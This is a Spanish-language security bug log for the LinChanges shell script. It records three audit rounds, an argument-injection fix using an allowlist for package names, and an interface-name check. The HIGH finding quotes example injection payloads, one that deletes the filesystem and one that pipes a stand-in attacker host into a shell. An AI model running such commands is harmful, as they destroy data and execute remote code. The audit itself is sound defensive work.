# Bug Log — LinChanges

No se han encontrado vulnerabilidades ni bugs significativos en la revisión automatizada de seguridad del 2026-06-25 (Revisión 1).

---

## 2026-06-25 — Revisión 2 (Auditoría profesional completa)

### [HIGH] Inyección de argumento en instalación/eliminación de paquetes
- **Archivo:** `linchanges.sh` líneas 605, 621
- **Descripción:** El nombre de paquete introducido por el usuario se pasaba sin validar directamente a `apt-get install`, `dnf install`, `pacman -S` y `zypper install`. Un input como `foo; rm -rf /` o `$(curl evil.com | sh)` se ejecutaría con privilegios de root.
- **Fix:** Allowlist `^[a-zA-Z0-9_.+\-]+$` aplicada a `pkg_name` antes del bloque `case`. Error con mensaje en pantalla si el valor no cumple el patrón.

### [MEDIA] Nombre de interfaz de red sin validación
- **Archivo:** `linchanges.sh` línea 778
- **Descripción:** El nombre de interfaz de red introducido por el usuario se pasaba directamente a `ip link set`, `dhclient` y `dhcpcd` sin comprobar que la interfaz existiera. Un valor arbitrario podría causar comportamiento inesperado o abuso de invocación.
- **Fix:** Comprobación `[[ -e "/sys/class/net/$iface" ]]` antes de operar sobre la interfaz. Si no existe, se muestra mensaje de error y se vuelve al menú.

---

## 2026-06-28 — Revisión 3 (Auditoría profesional completa)

No se han encontrado vulnerabilidades nuevas.

### Resultado de la auditoría
- No se encontró command injection: el script no usa `eval`, `. <(user_input)`, ni interpolación directa de input de usuario en comandos de shell.
- El input de nombre de paquete (`pkg_name`) está protegido por allowlist `^[a-zA-Z0-9_.+\-]+$`.
- El input de interfaz de red (`iface`) está protegido por comprobación `[[ -e "/sys/class/net/$iface" ]]`.
- `. /etc/os-release` es seguro: ese archivo solo puede ser modificado por root, y el script de todas formas requiere root para las operaciones peligrosas.
- `$old_kernels` en la limpieza de kernels dnf viene de `dnf repoquery` (salida controlada), pasado por `xargs dnf remove -y` — sin input de usuario.
- La gestión de bloqueos apt (`apt_locked`) usa `fuser`/`lsof` para detección, sin input de usuario.
- Archivos temporales: no se crean archivos temporales con input de usuario.
